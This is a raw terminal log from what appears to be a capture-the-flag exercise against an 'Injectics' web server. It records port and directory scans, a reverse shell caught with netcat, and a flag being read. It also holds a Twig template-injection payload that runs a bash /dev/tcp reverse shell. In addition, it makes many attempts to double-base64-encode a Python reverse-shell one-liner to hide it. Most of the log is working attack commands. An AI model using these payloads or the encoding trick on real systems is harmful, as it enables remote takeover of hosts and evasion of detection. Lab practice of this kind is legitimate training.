@@ -1,0 +1,323 @@
+┌──(kali㉿kali)-[~/Downloads/WORKSPACE]
+└─$ pwd
+/home/kali/Downloads/WORKSPACE
+                                                                                                                    
+┌──(kali㉿kali)-[~/Downloads/WORKSPACE]
+└─$ sudo nmap -sC -sV 10.48.130.9 -p- -o nmaplog_injectics.log                               
+[sudo] password for kali: 
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-10-09 10:51 -0600
+Stats: 0:00:00 elapsed; 0 hosts completed (0 up), 0 undergoing Script Pre-Scan
+NSE Timing: About 0.00% done
+Nmap scan report for 10.48.130.9
+Host is up (0.032s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 54:65:59:ee:2f:e7:94:40:5d:64:a5:96:15:a5:df:89 (RSA)
+|   256 7a:4e:4a:7f:41:74:b2:47:ea:d4:d7:18:71:f2:92:f0 (ECDSA)
+|_  256 78:0d:6c:1f:70:ed:47:86:63:d5:20:4c:2c:27:dc:b1 (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-title: Injectics Leaderboard
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 24.85 seconds
+                                                                                                                    
+┌──(kali㉿kali)-[~/Downloads/WORKSPACE]
+└─$ gobuster dir --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -b 404 -x .php,.xml,.txt -t 50 -o gob-1.log -u 10.48.130.9
+===============================================================
+Gobuster v3.8.2
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.48.130.9
+[+] Method:                  GET
+[+] Threads:                 50
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.8.2
+[+] Extensions:              php,xml,txt
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+index.php            (Status: 200) [Size: 6588]
+login.php            (Status: 200) [Size: 5401]
+flags                (Status: 301) [Size: 310] [--> http://10.48.130.9/flags/]
+css                  (Status: 301) [Size: 308] [--> http://10.48.130.9/css/]
+js                   (Status: 301) [Size: 307] [--> http://10.48.130.9/js/]
+javascript           (Status: 301) [Size: 315] [--> http://10.48.130.9/javascript/]
+logout.php           (Status: 302) [Size: 0] [--> index.php]
+vendor               (Status: 301) [Size: 311] [--> http://10.48.130.9/vendor/]
+dashboard.php        (Status: 302) [Size: 0] [--> dashboard.php]
+functions.php        (Status: 200) [Size: 0]
+phpmyadmin           (Status: 301) [Size: 315] [--> http://10.48.130.9/phpmyadmin/]
+conn.php             (Status: 200) [Size: 0]
+server-status        (Status: 403) [Size: 276]
+Progress: 882232 / 882232 (100.00%)
+===============================================================
+Finished
+===============================================================
+                                                                                                                    
+┌──(kali㉿kali)-[/run/media/kali/WORKSPACE]
+└─$ dirsearch -u http://10.48.130.9  
+/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
+  from pkg_resources import DistributionNotFound, VersionConflict
+
+  _|. _ _  _  _  _ _|_    v0.4.3
+ (_||| _) (/_(_|| (_| )
+
+Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460
+
+Output File: /run/media/kali/WORKSPACE/reports/http_10.48.130.9/_26-10-09_11-12-20.txt
+
+Target: http://10.48.130.9/
+
+[11:12:20] Starting: 
+[11:12:22] 301 -  307B  - /js  ->  http://10.48.130.9/js/
+[11:12:22] 403 -  276B  - /.htaccess.bak1
+[11:12:22] 403 -  276B  - /.ht_wsr.txt
+[11:12:22] 403 -  276B  - /.htaccess.orig
+[11:12:22] 403 -  276B  - /.htaccess.sample
+[11:12:22] 403 -  276B  - /.htaccess.save
+[11:12:22] 403 -  276B  - /.htaccess_extra
+[11:12:22] 403 -  276B  - /.htaccess_orig
+[11:12:22] 403 -  276B  - /.htaccess_sc
+[11:12:22] 403 -  276B  - /.htaccessOLD2
+[11:12:22] 403 -  276B  - /.htaccessOLD
+[11:12:22] 403 -  276B  - /.htaccessBAK
+[11:12:22] 403 -  276B  - /.html
+[11:12:22] 403 -  276B  - /.htm
+[11:12:23] 403 -  276B  - /.httr-oauth
+[11:12:23] 403 -  276B  - /.htpasswd_test
+[11:12:23] 403 -  276B  - /.htpasswds
+[11:12:24] 403 -  276B  - /.php
+[11:12:33] 200 -   48B  - /composer.json
+[11:12:33] 200 -    9KB - /composer.lock
+[11:12:34] 301 -  308B  - /css  ->  http://10.48.130.9/css/
+[11:12:34] 302 -    0B  - /dashboard.php  ->  dashboard.php
+[11:12:37] 301 -  310B  - /flags  ->  http://10.48.130.9/flags/
+[11:12:39] 301 -  315B  - /javascript  ->  http://10.48.130.9/javascript/
+[11:12:39] 403 -  276B  - /js/
+[11:12:40] 200 -    1KB - /login.php
+[11:12:40] 302 -    0B  - /logout.php  ->  index.php
+[11:12:41] 200 -    1KB - /mail.log
+[11:12:44] 301 -  315B  - /phpmyadmin  ->  http://10.48.130.9/phpmyadmin/
+[11:12:44] 200 -    3KB - /phpmyadmin/doc/html/index.html
+[11:12:45] 200 -    3KB - /phpmyadmin/
+[11:12:45] 200 -    3KB - /phpmyadmin/index.php
+[11:12:47] 403 -  276B  - /server-status
+[11:12:47] 403 -  276B  - /server-status/
+[11:12:52] 403 -  276B  - /vendor/
+[11:12:52] 200 -    0B  - /vendor/composer/autoload_classmap.php
+[11:12:52] 200 -    0B  - /vendor/composer/autoload_namespaces.php
+[11:12:52] 200 -    0B  - /vendor/autoload.php
+[11:12:52] 200 -    0B  - /vendor/composer/autoload_real.php
+[11:12:52] 200 -    0B  - /vendor/composer/autoload_psr4.php
+[11:12:52] 200 -    0B  - /vendor/composer/autoload_static.php
+[11:12:52] 200 -    0B  - /vendor/composer/ClassLoader.php
+[11:12:52] 200 -    0B  - /vendor/composer/autoload_files.php
+[11:12:52] 200 -   12KB - /vendor/composer/installed.json
+[11:12:52] 200 -    1KB - /vendor/composer/LICENSE
+
+Task Completed
+                                                                                                                    
+┌──(kali㉿kali)-[/run/media/kali/WORKSPACE]
+└─$ nc -lvnp 9877
+listening on [any] 9877 ...
+connect to [192.168.135.146] from (UNKNOWN) [192.168.135.146] 50770
+$ Traceback (most recent call last):
+  File "<string>", line 1, in <module>
+    import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.135.146",9877));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")
+                                                                                                                                                                                                      ~~~~~~~~~^^^^^^
+  File "/usr/lib/python3.13/pty.py", line 205, in spawn
+    _copy(master_fd, master_read, stdin_read)
+    ~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3.13/pty.py", line 133, in _copy
+    _copy(master_fd, master_read=master_read, stdin_read=stdin_read)
+    ~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3.13/pty.py", line 155, in _copy
+    rfds, wfds, _xfds = select(rfds, wfds, [])
+                        ~~~~~~^^^^^^^^^^^^^^^^
+KeyboardInterrupt
+                                                                                                                    
+┌──(kali㉿kali)-[/run/media/kali/WORKSPACE]
+└─$ nc -lvnp 9877
+listening on [any] 9877 ...
+connect to [192.168.135.146] from (UNKNOWN) [192.168.135.146] 53792
+$ Traceback (most recent call last):
+  File "<string>", line 1, in <module>
+    import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.135.146",9877));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh");
+                                                                                                                                                                                                      ~~~~~~~~~^^^^^^
+  File "/usr/lib/python3.13/pty.py", line 205, in spawn
+    _copy(master_fd, master_read, stdin_read)
+    ~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3.13/pty.py", line 133, in _copy
+    _copy(master_fd, master_read=master_read, stdin_read=stdin_read)
+    ~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3.13/pty.py", line 155, in _copy
+    rfds, wfds, _xfds = select(rfds, wfds, [])
+                        ~~~~~~^^^^^^^^^^^^^^^^
+KeyboardInterrupt
+                                                                                                                    
+┌──(kali㉿kali)-[/run/media/kali/WORKSPACE]
+└─$ nc -lvnp 9877
+listening on [any] 9877 ...
+connect to [192.168.135.146] from (UNKNOWN) [192.168.135.146] 42124
+$ ^C
+                                                                                                                    
+┌──(kali㉿kali)-[/run/media/kali/WORKSPACE]
+└─$ nc -lvnp 9877
+listening on [any] 9877 ...
+connect to [192.168.135.146] from (UNKNOWN) [10.48.130.9] 46344
+$ ls -al
+ls -al
+total 548
+drwxr-xr-x 6 ubuntu ubuntu   4096 Jul 31  2024 .
+drwxr-xr-x 3 root   root     4096 Jul 19  2024 ..
+-rw-rw-r-- 1 ubuntu ubuntu   1024 Jul 31  2024 .conn.php.swp
+-rw-r--r-- 1 ubuntu ubuntu    121 Jul 31  2024 .htaccess
+-rw-rw-r-- 1 ubuntu ubuntu   7370 Jul 23  2024 adminLogin007.php
+-rw-r--r-- 1 ubuntu ubuntu 433129 Jul 18  2024 banner.jpg
+-rw-r--r-- 1 ubuntu ubuntu     48 Jul 17  2024 composer.json
+-rw-r--r-- 1 ubuntu ubuntu   8723 Jul 17  2024 composer.lock
+-rw-r--r-- 1 ubuntu ubuntu   2867 Jul 31  2024 conn.php
+drwxrwxr-x 2 ubuntu ubuntu   4096 Jul 18  2024 css
+-rw-r--r-- 1 ubuntu ubuntu   7499 Jul 23  2024 dashboard.php
+-rw-rw-r-- 1 ubuntu ubuntu   7227 Jul 23  2024 edit_leaderboard.php
+drwxrwxr-x 2 ubuntu ubuntu   4096 Jul 18  2024 flags
+-rw-r--r-- 1 ubuntu ubuntu   2101 Jul 22  2024 functions.php
+-rw-r--r-- 1 ubuntu ubuntu   6083 Jul 23  2024 index.php
+-rwxrwxr-x 1 ubuntu ubuntu   3947 Jul 23  2024 injecticsService.php
+drwxrwxr-x 2 ubuntu ubuntu   4096 Jul 18  2024 js
+-rw-r--r-- 1 ubuntu ubuntu   5538 Jul 23  2024 login.php
+-rw-r--r-- 1 ubuntu ubuntu     99 Jun 16  2024 logout.php
+-rw-rw-r-- 1 ubuntu ubuntu   1098 Jul 23  2024 mail.log
+-rw-r--r-- 1 ubuntu ubuntu   1088 Jul 23  2024 script.js
+-rw-r--r-- 1 ubuntu ubuntu   1432 May 16  2023 styles.css
+-rw-rw-r-- 1 ubuntu ubuntu   6786 Jul 23  2024 update_profile.php
+drwxr-xr-x 6 ubuntu ubuntu   4096 Jul 17  2024 vendor
+$ cd flags
+cd flags
+$ ls 
+ls 
+5d8af1dc14503c7e4bdc8e51a3469f48.txt
+$ cat 5d8af1dc14503c7e4bdc8e51a3469f48.txt
+cat 5d8af1dc14503c7e4bdc8e51a3469f48.txt
+THM{5735172b6c147f4dd649872f73e0fdea}
+$   
+┌──(kali㉿kali)-[/run/media/kali/WORKSPACE]
+└─$ {{ ['bash -c "exec bash -i >& /dev/tcp/192.168.135.146/9987 0>&1"', ""] | sort('passthru') }}
+
+zsh: number expected
+                                                                                                                    
+zsh: bad pattern: [bash -c "exec bash -i >& /dev/tcp/192.168.135.146/9987 0>&1",
+┌──(kali㉿kali)-[/run/media/kali/WORKSPACE]
+└─$ python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.135.146",9877));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
+^C
+                                                                                                                    
+┌──(kali㉿kali)-[/run/media/kali/WORKSPACE]
+└─$ {{ ["^[[200~{{ ['bash -c "exec bash -i >& /dev/tcp/192.168.135.146/9987 0>&1"', ""] | sort('passthru') }}, ""] | sort('passthru') }}
+cursh cursh dquote> "
+cursh cursh> 
+                                                                                                                    
+┌──(kali㉿kali)-[/run/media/kali/WORKSPACE]
+└─$ echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.135.146",9877));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh");' | base64                                         
+aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5F
+VCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjE5Mi4xNjguMTM1LjE0NiIsOTg3Nykp
+O29zLmR1cDIocy5maWxlbm8oKSwwKTsgb3MuZHVwMihzLmZpbGVubygpLDEpO29zLmR1cDIocy5m
+aWxlbm8oKSwyKTtpbXBvcnQgcHR5OyBwdHkuc3Bhd24oInNoIik7Cg==
+                                                                                                       
+┌──(kali㉿kali)-[/run/media/kali/WORKSPACE]
+└─$ echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.135.146",9877));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh");' | base64 | base64
+YVcxd2IzSjBJSE52WTJ0bGRDeHpkV0p3Y205alpYTnpMRzl6TzNNOWMyOWphMlYwTG5OdlkydGxk
+Q2h6YjJOclpYUXVRVVpmU1U1RgpWQ3h6YjJOclpYUXVVMDlEUzE5VFZGSkZRVTBwTzNNdVkyOXVi
+bVZqZENnb0lqRTVNaTR4TmpndU1UTTFMakUwTmlJc09UZzNOeWtwCk8yOXpMbVIxY0RJb2N5NW1h
+V3hsYm04b0tTd3dLVHNnYjNNdVpIVndNaWh6TG1acGJHVnVieWdwTERFcE8yOXpMbVIxY0RJb2N5
+NW0KYVd4bGJtOG9LU3d5S1R0cGJYQnZjblFnY0hSNU95QndkSGt1YzNCaGQyNG9Jbk5vSWlrN0Nn
+PT0K
+                                                                                                       
+┌──(kali㉿kali)-[/run/media/kali/WORKSPACE]
+└─$ 
+                                                                                                       
+┌──(kali㉿kali)-[/run/media/kali/WORKSPACE]
+└─$ echo 'YVcxd2IzSjBJSE52WTJ0bGRDeHpkV0p3Y205alpYTnpMRzl6TzNNOWMyOWphMlYwTG5OdlkydGxkQ2h6YjJOclpYUXVRVVpmU1U1RgpWQ3h6YjJOclpYUXVVMDlEUzE5VFZGSkZRVTBwTzNNdVkyOXVibVZqZENnb0lqRTVNaTR4TmpndU1UTTFMakUwTmlJc09UZzNOeWtwCk8yOXpMbVIxY0RJb2N5NW1hV3hsYm04b0tTd3dLVHNnYjNNdVpIVndNaWh6TG1acGJHVnVieWdwTERFcE8yOXpMbVIxY0RJb2N5NW0KYVd4bGJtOG9LU3d5S1R0cGJYQnZjblFnY0hSNU95QndkSGt1YzNCaGQyNG9Jbk5vSWlrN0NnPT0K' | base64 -d | base64 -d | python3 -c 
+Argument expected for the -c option
+usage: python3 [option] ... [-c cmd | -m mod | file | -] [arg] ...
+Try `python -h' for more information.
+                                                                                                       
+┌──(kali㉿kali)-[/run/media/kali/WORKSPACE]
+└─$ python3 -c $(echo 'YVcxd2IzSjBJSE52WTJ0bGRDeHpkV0p3Y205alpYTnpMRzl6TzNNOWMyOWphMlYwTG5OdlkydGxkQ2h6YjJOclpYUXVRVVpmU1U1RgpWQ3h6YjJOclpYUXVVMDlEUzE5VFZGSkZRVTBwTzNNdVkyOXVibVZqZENnb0lqRTVNaTR4TmpndU1UTTFMakUwTmlJc09UZzNOeWtwCk8yOXpMbVIxY0RJb2N5NW1hV3hsYm04b0tTd3dLVHNnYjNNdVpIVndNaWh6TG1acGJHVnVieWdwTERFcE8yOXpMbVIxY0RJb2N5NW0KYVd4bGJtOG9LU3d5S1R0cGJYQnZjblFnY0hSNU95QndkSGt1YzNCaGQyNG9Jbk5vSWlrN0NnPT0K' | base64 -d | base64 -d)
+  File "<string>", line 1
+    import
+          ^
+SyntaxError: Expected one or more names after 'import'
+                                                                                                       
+┌──(kali㉿kali)-[/run/media/kali/WORKSPACE]
+└─$ echo 'YVcxd2IzSjBJSE52WTJ0bGRDeHpkV0p3Y205alpYTnpMRzl6TzNNOWMyOWphMlYwTG5OdlkydGxkQ2h6YjJOclpYUXVRVVpmU1U1RgpWQ3h6YjJOclpYUXVVMDlEUzE5VFZGSkZRVTBwTzNNdVkyOXVibVZqZENnb0lqRTVNaTR4TmpndU1UTTFMakUwTmlJc09UZzNOeWtwCk8yOXpMbVIxY0RJb2N5NW1hV3hsYm04b0tTd3dLVHNnYjNNdVpIVndNaWh6TG1acGJHVnVieWdwTERFcE8yOXpMbVIxY0RJb2N5NW0KYVd4bGJtOG9LU3d5S1R0cGJYQnZjblFnY0hSNU95QndkSGt1YzNCaGQyNG9Jbk5vSWlrN0NnPT0K' | base64 -d | base64 -d             
+import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.135.146",9877));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh");
+                                                                                                       
+┌──(kali㉿kali)-[/run/media/kali/WORKSPACE]
+└─$ echo "'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.135.146\",9877));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"sh\");'" | base64 | base64
+SjJsdGNHOXlkQ0J6YjJOclpYUXNjM1ZpY0hKdlkyVnpjeXh2Y3p0elBYTnZZMnRsZEM1emIyTnJa
+WFFvYzI5amEyVjBMa0ZHWDBsTwpSVlFzYzI5amEyVjBMbE5QUTB0ZlUxUlNSVUZOS1R0ekxtTnZi
+bTVsWTNRb0tDSXhPVEl1TVRZNExqRXpOUzR4TkRZaUxEazROemNwCktUdHZjeTVrZFhBeUtITXVa
+bWxzWlc1dktDa3NNQ2s3SUc5ekxtUjFjRElvY3k1bWFXeGxibThvS1N3eEtUdHZjeTVrZFhBeUtI
+TXUKWm1sc1pXNXZLQ2tzTWlrN2FXMXdiM0owSUhCMGVUc2djSFI1TG5Od1lYZHVLQ0p6YUNJcE95
+Y0sK
+                                                                                                       
+┌──(kali㉿kali)-[/run/media/kali/WORKSPACE]
+└─$ python3 -c $(echo 'SjJsdGNHOXlkQ0J6YjJOclpYUXNjM1ZpY0hKdlkyVnpjeXh2Y3p0elBYTnZZMnRsZEM1emIyTnJaWFFvYzI5amEyVjBMa0ZHWDBsTwpSVlFzYzI5amEyVjBMbE5QUTB0ZlUxUlNSVUZOS1R0ekxtTnZibTVsWTNRb0tDSXhPVEl1TVRZNExqRXpOUzR4TkRZaUxEazROemNwCktUdHZjeTVrZFhBeUtITXVabWxzWlc1dktDa3NNQ2s3SUc5ekxtUjFjRElvY3k1bWFXeGxibThvS1N3eEtUdHZjeTVrZFhBeUtITXUKWm1sc1pXNXZLQ2tzTWlrN2FXMXdiM0owSUhCMGVUc2djSFI1TG5Od1lYZHVLQ0p6YUNJcE95Y0sK' | base64 -d | base64 -d)     
+  File "<string>", line 1
+    'import
+    ^
+SyntaxError: unterminated string literal (detected at line 1)
+                                                                                                       
+┌──(kali㉿kali)-[/run/media/kali/WORKSPACE]
+└─$ python3 -c $(echo SjJsdGNHOXlkQ0J6YjJOclpYUXNjM1ZpY0hKdlkyVnpjeXh2Y3p0elBYTnZZMnRsZEM1emIyTnJaWFFvYzI5amEyVjBMa0ZHWDBsTwpSVlFzYzI5amEyVjBMbE5QUTB0ZlUxUlNSVUZOS1R0ekxtTnZibTVsWTNRb0tDSXhPVEl1TVRZNExqRXpOUzR4TkRZaUxEazROemNwCktUdHZjeTVrZFhBeUtITXVabWxzWlc1dktDa3NNQ2s3SUc5ekxtUjFjRElvY3k1bWFXeGxibThvS1N3eEtUdHZjeTVrZFhBeUtITXUKWm1sc1pXNXZLQ2tzTWlrN2FXMXdiM0owSUhCMGVUc2djSFI1TG5Od1lYZHVLQ0p6YUNJcE95Y0sK | base64 -d | base64 -d) 
+  File "<string>", line 1
+    'import
+    ^
+SyntaxError: unterminated string literal (detected at line 1)
+                                                                                                       
+┌──(kali㉿kali)-[/run/media/kali/WORKSPACE]
+└─$ $(echo SjJsdGNHOXlkQ0J6YjJOclpYUXNjM1ZpY0hKdlkyVnpjeXh2Y3p0elBYTnZZMnRsZEM1emIyTnJaWFFvYzI5amEyVjBMa0ZHWDBsTwpSVlFzYzI5amEyVjBMbE5QUTB0ZlUxUlNSVUZOS1R0ekxtTnZibTVsWTNRb0tDSXhPVEl1TVRZNExqRXpOUzR4TkRZaUxEazROemNwCktUdHZjeTVrZFhBeUtITXVabWxzWlc1dktDa3NNQ2s3SUc5ekxtUjFjRElvY3k1bWFXeGxibThvS1N3eEtUdHZjeTVrZFhBeUtITXUKWm1sc1pXNXZLQ2tzTWlrN2FXMXdiM0owSUhCMGVUc2djSFI1TG5Od1lYZHVLQ0p6YUNJcE95Y0sK | base64 -d | base64 -d) 
+'import: command not found
+                                                                                                       
+┌──(kali㉿kali)-[/run/media/kali/WORKSPACE]
+└─$ echo SjJsdGNHOXlkQ0J6YjJOclpYUXNjM1ZpY0hKdlkyVnpjeXh2Y3p0elBYTnZZMnRsZEM1emIyTnJaWFFvYzI5amEyVjBMa0ZHWDBsTwpSVlFzYzI5amEyVjBMbE5QUTB0ZlUxUlNSVUZOS1R0ekxtTnZibTVsWTNRb0tDSXhPVEl1TVRZNExqRXpOUzR4TkRZaUxEazROemNwCktUdHZjeTVrZFhBeUtITXVabWxzWlc1dktDa3NNQ2s3SUc5ekxtUjFjRElvY3k1bWFXeGxibThvS1N3eEtUdHZjeTVrZFhBeUtITXUKWm1sc1pXNXZLQ2tzTWlrN2FXMXdiM0owSUhCMGVUc2djSFI1TG5Od1lYZHVLQ0p6YUNJcE95Y0sK | base64 -d | base64 -d   
+'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.135.146",9877));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh");'
+                                                                                                       
+┌──(kali㉿kali)-[/run/media/kali/WORKSPACE]
+└─$ python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.135.146",9877));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh");'
+
+^C
+                                                                                                       
+┌──(kali㉿kali)-[/run/media/kali/WORKSPACE]
+└─$ echo SjJsdGNHOXlkQ0J6YjJOclpYUXNjM1ZpY0hKdlkyVnpjeXh2Y3p0elBYTnZZMnRsZEM1emIyTnJaWFFvYzI5amEyVjBMa0ZHWDBsTwpSVlFzYzI5amEyVjBMbE5QUTB0ZlUxUlNSVUZOS1R0ekxtTnZibTVsWTNRb0tDSXhPVEl1TVRZNExqRXpOUzR4TkRZaUxEazROemNwCktUdHZjeTVrZFhBeUtITXVabWxzWlc1dktDa3NNQ2s3SUc5ekxtUjFjRElvY3k1bWFXeGxibThvS1N3eEtUdHZjeTVrZFhBeUtITXUKWm1sc1pXNXZLQ2tzTWlrN2FXMXdiM0owSUhCMGVUc2djSFI1TG5Od1lYZHVLQ0p6YUNJcE95Y0sK | base64 -d | base64 -d   
+'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.135.146",9877));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh");'
+                                                                                                       
+┌──(kali㉿kali)-[/run/media/kali/WORKSPACE]
+└─$ echo SjJsdGNHOXlkQ0J6YjJOclpYUXNjM1ZpY0hKdlkyVnpjeXh2Y3p0elBYTnZZMnRsZEM1emIyTnJaWFFvYzI5amEyVjBMa0ZHWDBsTwpSVlFzYzI5amEyVjBMbE5QUTB0ZlUxUlNSVUZOS1R0ekxtTnZibTVsWTNRb0tDSXhPVEl1TVRZNExqRXpOUzR4TkRZaUxEazROemNwCktUdHZjeTVrZFhBeUtITXVabWxzWlc1dktDa3NNQ2s3SUc5ekxtUjFjRElvY3k1bWFXeGxibThvS1N3eEtUdHZjeTVrZFhBeUtITXUKWm1sc1pXNXZLQ2tzTWlrN2FXMXdiM0owSUhCMGVUc2djSFI1TG5Od1lYZHVLQ0p6YUNJcE95Y0sK | base64 -d | base64 -d | python3 -c
+Argument expected for the -c option
+usage: python3 [option] ... [-c cmd | -m mod | file | -] [arg] ...
+Try `python -h' for more information.
+                                                                                                       
+┌──(kali㉿kali)-[/run/media/kali/WORKSPACE]
+└─$ $(echo SjJsdGNHOXlkQ0J6YjJOclpYUXNjM1ZpY0hKdlkyVnpjeXh2Y3p0elBYTnZZMnRsZEM1emIyTnJaWFFvYzI5amEyVjBMa0ZHWDBsTwpSVlFzYzI5amEyVjBMbE5QUTB0ZlUxUlNSVUZOS1R0ekxtTnZibTVsWTNRb0tDSXhPVEl1TVRZNExqRXpOUzR4TkRZaUxEazROemNwCktUdHZjeTVrZFhBeUtITXVabWxzWlc1dktDa3NNQ2s3SUc5ekxtUjFjRElvY3k1bWFXeGxibThvS1N3eEtUdHZjeTVrZFhBeUtITXUKWm1sc1pXNXZLQ2tzTWlrN2FXMXdiM0owSUhCMGVUc2djSFI1TG5Od1lYZHVLQ0p6YUNJcE95Y0sK | base64 -d | base64 -d)          
+'import: command not found
+                                                                                                       
+┌──(kali㉿kali)-[/run/media/kali/WORKSPACE]
+└─$ python3 -c $(echo SjJsdGNHOXlkQ0J6YjJOclpYUXNjM1ZpY0hKdlkyVnpjeXh2Y3p0elBYTnZZMnRsZEM1emIyTnJaWFFvYzI5amEyVjBMa0ZHWDBsTwpSVlFzYzI5amEyVjBMbE5QUTB0ZlUxUlNSVUZOS1R0ekxtTnZibTVsWTNRb0tDSXhPVEl1TVRZNExqRXpOUzR4TkRZaUxEazROemNwCktUdHZjeTVrZFhBeUtITXVabWxzWlc1dktDa3NNQ2s3SUc5ekxtUjFjRElvY3k1bWFXeGxibThvS1N3eEtUdHZjeTVrZFhBeUtITXUKWm1sc1pXNXZLQ2tzTWlrN2FXMXdiM0owSUhCMGVUc2djSFI1TG5Od1lYZHVLQ0p6YUNJcE95Y0sK | base64 -d | base64 -d)
+  File "<string>", line 1
+    'import
+    ^
+SyntaxError: unterminated string literal (detected at line 1)
+                                                                                                       
+┌──(kali㉿kali)-[/run/media/kali/WORKSPACE]
+└─$ python3 -c "$(echo YVcxd2IzSjBJSE52WTJ0bGRDeHpkV0p3Y205alpYTnpMRzl6TzNNOWMyOWphMlYwTG5OdlkydGxkQ2h6YjJOclpYUXVRVVpmU1U1RgpWQ3h6YjJOclpYUXVVMDlEUzE5VFZGSkZRVTBwTzNNdVkyOXVibVZqZENnb0lqRTVNaTR4TmpndU1UTTFMakUwTmlJc09UZzNOeWtwCk8yOXpMbVIxY0RJb2N5NW1hV3hsYm04b0tTd3dLVHNnYjNNdVpIVndNaWh6TG1acGJHVnVieWdwTERFcE8yOXpMbVIxY0RJb2N5NW0KYVd4bGJtOG9LU3d5S1R0cGJYQnZjblFnY0hSNU95QndkSGt1YzNCaGQyNG9Jbk5vSWlrN0NnPT0K | base64 -d | base64 -d)" 
